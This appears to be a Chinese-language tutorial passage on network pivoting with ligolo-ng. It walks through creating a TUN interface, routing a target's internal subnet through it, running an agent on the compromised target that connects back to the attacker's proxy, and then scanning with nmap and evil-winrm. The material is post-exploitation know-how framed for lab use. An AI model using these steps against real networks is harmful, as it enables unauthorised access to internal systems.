全程必须用：

1. `ip tuntap`：创建 TUN 虚拟网卡
2. `ip link`：启用虚拟网卡
3. `ip route`：添加内网路由指向这张 tun 网卡

## 二、手动完整流程（全是你学过的命令）

### 1）攻击机创建并拉起 TUN 网卡（ip link 相关）

bash

```bash
# 创建名为 ligolo 的 tun 设备
sudo ip tuntap add user $USER mode tun ligolo
# 启用网卡（ip link set up）
sudo ip link set ligolo up
# 查看网卡是否存在
ip link
```

### 2）添加内网路由（ip route）

假设靶机内网网段 `192.168.30.0/24`，所有访问这个段的流量走 ligolo 虚拟网卡：

bash

运行

```bash
sudo ip route add 192.168.30.0/24 dev ligolo
# 查看路由表确认
ip route
```

### 3）启动 ligolo 隧道

bash

运行

```bash
# 攻击机开 proxy
sudo ./ligolo-proxy -selfcert -laddr 0.0.0.0:11601
# 靶机运行 agent 回连
./agent -connect 你的攻击机IP:11601 -ignore-cert
# ligolo 交互界面里启动隧道
session 1
start
```

之后你可以直接 `nmap 192.168.30.x`、`evil-winrm`，不用 proxychains。

## 三、新版简化：autoroute 自动替代手动 ip 命令

0.8+ 版本内置 `autoroute`，不用手动敲 `ip link / ip route`：

1. 连上 agent 后执行 `ifconfig` 查看靶机所有内网段

2. 输入 `autoroute`
   
   工具会**自动创建 tun、up 网卡、添加路由**，省去手动输命令步骤。

## 四、清理环境（还是 ip link/ip route）

用完要删路由、关网卡，否则网络异常：

bash

运行

```bash
# 删除路由
sudo ip route del 192.168.30.0/24 dev ligolo
# 关闭并删除 tun 网卡
sudo ip link set ligolo down
sudo ip tuntap del mode tun ligolo
```

## 五、一句话总结

- `ip link`：管理 ligolo 专用虚拟 TUN 网卡开关

- `ip route`：把目标内网流量路由交给 ligolo 隧道
  
  两者是 ligolo-ng 底层基础，不配置这两条命令隧道无法转发内网流量。
